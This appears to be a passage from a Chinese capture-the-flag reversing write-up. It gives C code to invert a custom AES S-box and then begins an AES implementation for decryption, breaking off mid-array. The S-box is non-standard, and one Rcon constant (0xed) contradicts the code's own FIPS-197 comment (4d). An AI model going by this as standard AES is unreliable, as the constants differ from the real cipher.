<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    uint8_t S_BOX[<span class="number">16</span>][<span class="number">16</span>] = &#123;<span class="number">0x29</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x6E</span>, <span class="number">0x85</span>, <span class="number">0x9C</span>, <span class="number">0xB3</span>, <span class="number">0xCA</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x0F</span>, <span class="number">0x26</span>, <span class="number">0x3D</span>, <span class="number">0x54</span>, <span class="number">0x6B</span>, <span class="number">0x82</span>, <span class="number">0x99</span>, <span class="number">0xB0</span>, <span class="number">0xC7</span>, <span class="number">0xDE</span>, <span class="number">0xF5</span>, <span class="number">0x0C</span>, <span class="number">0x23</span>, <span class="number">0x3A</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x7F</span>, <span class="number">0x96</span>, <span class="number">0xAD</span>, <span class="number">0xC4</span>, <span class="number">0xDB</span>, <span class="number">0xF2</span>, <span class="number">0x09</span>, <span class="number">0x20</span>, <span class="number">0x37</span>, <span class="number">0x4E</span>, <span class="number">0x65</span>, <span class="number">0x7C</span>, <span class="number">0x93</span>, <span class="number">0xAA</span>, <span class="number">0xC1</span>, <span class="number">0xD8</span>, <span class="number">0xEF</span>, <span class="number">0x06</span>, <span class="number">0x1D</span>, <span class="number">0x34</span>, <span class="number">0x4B</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x90</span>, <span class="number">0xA7</span>, <span class="number">0xBE</span>, <span class="number">0xD5</span>, <span class="number">0xEC</span>, <span class="number">0x03</span>, <span class="number">0x1A</span>, <span class="number">0x31</span>, <span class="number">0x48</span>, <span class="number">0x5F</span>, <span class="number">0x76</span>, <span class="number">0x8D</span>, <span class="number">0xA4</span>, <span class="number">0xBB</span>, <span class="number">0xD2</span>, <span class="number">0xE9</span>, <span class="number">0x00</span>, <span class="number">0x17</span>, <span class="number">0x2E</span>, <span class="number">0x45</span>, <span class="number">0x5C</span>, <span class="number">0x73</span>, <span class="number">0x8A</span>, <span class="number">0xA1</span>, <span class="number">0xB8</span>, <span class="number">0xCF</span>, <span class="number">0xE6</span>, <span class="number">0xFD</span>, <span class="number">0x14</span>, <span class="number">0x2B</span>, <span class="number">0x42</span>, <span class="number">0x59</span>, <span class="number">0x70</span>, <span class="number">0x87</span>, <span class="number">0x9E</span>, <span class="number">0xB5</span>, <span class="number">0xCC</span>, <span class="number">0xE3</span>, <span class="number">0xFA</span>, <span class="number">0x11</span>, <span class="number">0x28</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0x6D</span>, <span class="number">0x84</span>, <span class="number">0x9B</span>, <span class="number">0xB2</span>, <span class="number">0xC9</span>, <span class="number">0xE0</span>, <span class="number">0xF7</span>, <span class="number">0x0E</span>, <span class="number">0x25</span>, <span class="number">0x3C</span>, <span class="number">0x53</span>, <span class="number">0x6A</span>, <span class="number">0x81</span>, <span class="number">0x98</span>, <span class="number">0xAF</span>, <span class="number">0xC6</span>, <span class="number">0xDD</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x67</span>, <span class="number">0x7E</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0xC3</span>, <span class="number">0xDA</span>, <span class="number">0xF1</span>, <span class="number">0x08</span>, <span class="number">0x1F</span>, <span class="number">0x36</span>, <span class="number">0x4D</span>, <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x92</span>, <span class="number">0xA9</span>, <span class="number">0xC0</span>, <span class="number">0xD7</span>, <span class="number">0xEE</span>, <span class="number">0x05</span>, <span class="number">0x1C</span>, <span class="number">0x33</span>, <span class="number">0x4A</span>, <span class="number">0x61</span>, <span class="number">0x78</span>, <span class="number">0x8F</span>, <span class="number">0xA6</span>, <span class="number">0xBD</span>, <span class="number">0xD4</span>, <span class="number">0xEB</span>, <span class="number">0x02</span>, <span class="number">0x19</span>, <span class="number">0x30</span>, <span class="number">0x47</span>, <span class="number">0x5E</span>, <span class="number">0x75</span>, <span class="number">0x8C</span>, <span class="number">0xA3</span>, <span class="number">0xBA</span>, <span class="number">0xD1</span>, <span class="number">0xE8</span>, <span class="number">0xFF</span>, <span class="number">0x16</span>, <span class="number">0x2D</span>, <span class="number">0x44</span>, <span class="number">0x5B</span>, <span class="number">0x72</span>, <span class="number">0x89</span>, <span class="number">0xA0</span>, <span class="number">0xB7</span>, <span class="number">0xCE</span>, <span class="number">0xE5</span>, <span class="number">0xFC</span>, <span class="number">0x13</span>, <span class="number">0x2A</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x6F</span>, <span class="number">0x86</span>, <span class="number">0x9D</span>, <span class="number">0xB4</span>, <span class="number">0xCB</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x10</span>, <span class="number">0x27</span>, <span class="number">0x3E</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x83</span>, <span class="number">0x9A</span>, <span class="number">0xB1</span>, <span class="number">0xC8</span>, <span class="number">0xDF</span>, <span class="number">0xF6</span>, <span class="number">0x0D</span>, <span class="number">0x24</span>, <span class="number">0x3B</span>, <span class="number">0x52</span>, <span class="number">0x69</span>, <span class="number">0x80</span>, <span class="number">0x97</span>, <span class="number">0xAE</span>, <span class="number">0xC5</span>, <span class="number">0xDC</span>, <span class="number">0xF3</span>, <span class="number">0x0A</span>, <span class="number">0x21</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, <span class="number">0x66</span>, <span class="number">0x7D</span>, <span class="number">0x94</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xD9</span>, <span class="number">0xF0</span>, <span class="number">0x07</span>, <span class="number">0x1E</span>, <span class="number">0x35</span>, <span class="number">0x4C</span>, <span class="number">0x63</span>, <span class="number">0x7A</span>, <span class="number">0x91</span>, <span class="number">0xA8</span>, <span class="number">0xBF</span>, <span class="number">0xD6</span>, <span class="number">0xED</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0x32</span>, <span class="number">0x49</span>, <span class="number">0x60</span>, <span class="number">0x77</span>, <span class="number">0x8E</span>, <span class="number">0xA5</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0x2F</span>, <span class="number">0x46</span>, <span class="number">0x5D</span>, <span class="number">0x74</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0xB9</span>, <span class="number">0xD0</span>, <span class="number">0xE7</span>, <span class="number">0xFE</span>, <span class="number">0x15</span>, <span class="number">0x2C</span>, <span class="number">0x43</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x88</span>, <span class="number">0x9F</span>, <span class="number">0xB6</span>, <span class="number">0xCD</span>, <span class="number">0xE4</span>, <span class="number">0xFB</span>, <span class="number">0x12</span>&#125;;</span><br><span class="line">    uint8_t Te_InvS[<span class="number">16</span>][<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;        //逆S盒缓存</span><br><span class="line">    uint8_t Te_InVSAdd[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;            //位置</span><br><span class="line">    <span class="keyword">for</span> (uint8_t i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;                    //计算逆S盒</span><br><span class="line">        <span class="keyword">for</span> (uint8_t n = <span class="number">0</span>; n &lt; <span class="number">16</span>; n++) &#123;</span><br><span class="line">            Te_InVSAdd[<span class="number">0</span>] = (S_BOX[i][n] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0f</span>;        //取行</span><br><span class="line">            Te_InVSAdd[<span class="number">1</span>] = (S_BOX[i][n] &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0x0f</span>;        //取列</span><br><span class="line">            Te_InvS[Te_InVSAdd[<span class="number">0</span>]][Te_InVSAdd[<span class="number">1</span>]] = (i * <span class="number">16</span> + n)&amp;<span class="number">0xff</span>;        //置值</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">16</span>; ii++)&#123;</span><br><span class="line">        printf(<span class="string">&quot;%d,&quot;</span>,Te_InvS[i][ii]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到逆sbox，然后拿aes解密就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;memory.h&gt;</span></span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">typedef enum &#123;</span><br><span class="line">    AES_CYPHER_128,</span><br><span class="line">    AES_CYPHER_192,</span><br><span class="line">    AES_CYPHER_256,</span><br><span class="line">&#125; AES_CYPHER_T;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">/*</span><br><span class="line">* Encryption Rounds</span><br><span class="line">*/</span><br><span class="line"><span class="built_in">int</span> g_aes_key_bits[] = &#123;</span><br><span class="line">    /* AES_CYPHER_128 */ <span class="number">128</span>,</span><br><span class="line">    /* AES_CYPHER_192 */ <span class="number">192</span>,</span><br><span class="line">    /* AES_CYPHER_256 */ <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">int</span> g_aes_rounds[] = &#123;</span><br><span class="line">    /* AES_CYPHER_128 */  <span class="number">10</span>,</span><br><span class="line">    /* AES_CYPHER_192 */  <span class="number">12</span>,</span><br><span class="line">    /* AES_CYPHER_256 */  <span class="number">14</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">int</span> g_aes_nk[] = &#123;</span><br><span class="line">    /* AES_CYPHER_128 */  <span class="number">4</span>,</span><br><span class="line">    /* AES_CYPHER_192 */  <span class="number">6</span>,</span><br><span class="line">    /* AES_CYPHER_256 */  <span class="number">8</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">int</span> g_aes_nb[] = &#123;</span><br><span class="line">    /* AES_CYPHER_128 */  <span class="number">4</span>,</span><br><span class="line">    /* AES_CYPHER_192 */  <span class="number">4</span>,</span><br><span class="line">    /* AES_CYPHER_256 */  <span class="number">4</span>,</span><br><span class="line">&#125;;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">/*</span><br><span class="line">* aes Rcon:</span><br><span class="line">*</span><br><span class="line">* WARNING: Rcon <span class="keyword">is</span> designed starting <span class="keyword">from</span> <span class="number">1</span> to <span class="number">15</span>, <span class="keyword">not</span> <span class="number">0</span> to <span class="number">14.</span></span><br><span class="line">*          FIPS-<span class="number">197</span> Page <span class="number">9</span>: <span class="string">&quot;note that i starts at 1, not 0&quot;</span></span><br><span class="line">*</span><br><span class="line">* i    |   <span class="number">0</span>     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span>     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span>     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span>    <span class="number">10</span>    <span class="number">11</span>    <span class="number">12</span>    <span class="number">13</span>    <span class="number">14</span></span><br><span class="line">* -----+------------------------------------------------------------------------------------------</span><br><span class="line">*      | [01]  [02]  [04]  [08]  [<span class="number">10</span>]  [<span class="number">20</span>]  [<span class="number">40</span>]  [<span class="number">80</span>]  [1b]  [<span class="number">36</span>]  [6c]  [d8]  [ab]  [4d]  [9a]</span><br><span class="line">* RCON | [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]</span><br><span class="line">*      | [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]</span><br><span class="line">*      | [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]  [<span class="number">00</span>]</span><br><span class="line">*/</span><br><span class="line">static const uint32_t g_aes_rcon[] = &#123;</span><br><span class="line">    <span class="number">0x01000000</span>, <span class="number">0x02000000</span>, <span class="number">0x04000000</span>, <span class="number">0x08000000</span>, <span class="number">0x10000000</span>, <span class="number">0x20000000</span>, <span class="number">0x40000000</span>, <span class="number">0x80000000</span>,</span><br><span class="line">    <span class="number">0x1b000000</span>, <span class="number">0x36000000</span>, <span class="number">0x6c000000</span>, <span class="number">0xd8000000</span>, <span class="number">0xab000000</span>, <span class="number">0xed000000</span>, <span class="number">0x9a000000</span></span><br><span class="line">&#125;;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">/*</span><br><span class="line">* aes sbox <span class="keyword">and</span> invert-sbox</span><br><span class="line">*/</span><br><span class="line">static const uint8_t g_aes_sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">    /* <span class="number">0</span>     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span>   u  <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span>     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span>     A     B     C     D     E     F  */</span><br><span class="line">    <span class="number">0x29</span>, <span class="number">0x40</span>, <span class="number">0x57</span>, <span class="number">0x6E</span>, <span class="number">0x85</span>, <span class="number">0x9C</span>, <span class="number">0xB3</span>, <span class="number">0xCA</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x0F</span>, <span class="number">0x26</span>, <span class="number">0x3D</span>, <span class="number">0x54</span>, <span class="number">0x6B</span>, <span class="number">0x82</span>, <span class="number">0x99</span>, <span class="number">0xB0</span>, <span class="number">0xC7</span>, <span class="number">0xDE</span>, <span class="number">0xF5</span>, <span class="number">0x0C</span>, <span class="number">0x23</span>, <span class="number">0x3A</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x7F</span>, <span class="number">0x96</span>, <span class="number">0xAD</span>, <span class="number">0xC4</span>, <span class="number">0xDB</span>, <span class="number">0xF2</span>, <span class="number">0x09</span>, <span class="number">0x20</span>, <span class="number">0x37</span>, <span class="number">0x4E</span>, <span class="number">0x65</span>, <span class="number">0x7C</span>, <span class="number">0x93</span>, <span class="number">0xAA</span>, <span class="number">0xC1</span>, <span class="number">0xD8</span>, <span class="number">0xEF</span>, <span class="number">0x06</span>, <span class="number">0x1D</span>, <span class="number">0x34</span>, <span class="number">0x4B</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x90</span>, <span class="number">0xA7</span>, <span class="number">0xBE</span>, <span class="number">0xD5</span>, <span class="number">0xEC</span>, <span class="number">0x03</span>, <span class="number">0x1A</span>, <span class="number">0x31</span>, <span class="number">0x48</span>, <span class="number">0x5F</span>, <span class="number">0x76</span>, <span class="number">0x8D</span>, <span class="number">0xA4</span>, <span class="number">0xBB</span>, <span class="number">0xD2</span>, <span class="number">0xE9</span>, <span class="number">0x00</span>, <span class="number">0x17</span>, <span class="number">0x2E</span>, <span class="number">0x45</span>, <span class="number">0x5C</span>, <span class="number">0x73</span>, <span class="number">0x8A</span>, <span class="number">0xA1</span>, <span class="number">0xB8</span>, <span class="number">0xCF</span>, <span class="number">0xE6</span>, <span class="number">0xFD</span>, <span class="number">0x14</span>, <span class="number">0x2B</span>, <span class="number">0x42</span>, <span class="number">0x59</span>, <span class="number">0x70</span>, <span class="number">0x87</span>, <span class="number">0x9E</span>, <span class="number">0xB5</span>, <span class="number">0xCC</span>, <span class="number">0xE3</span>, <span class="number">0xFA</span>, <span class="number">0x11</span>, <span class="number">0x28</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0x6D</span>, <span class="number">0x84</span>, <span class="number">0x9B</span>, <span class="number">0xB2</span>, <span class="number">0xC9</span>, <span class="number">0xE0</span>, <span class="number">0xF7</span>, <span class="number">0x0E</span>, <span class="number">0x25</span>, <span class="number">0x3C</span>, <span class="number">0x53</span>, <span class="number">0x6A</span>, <span class="number">0x81</span>, <span class="number">0x98</span>, <span class="number">0xAF</span>, <span class="number">0xC6</span>, <span class="number">0xDD</span>, 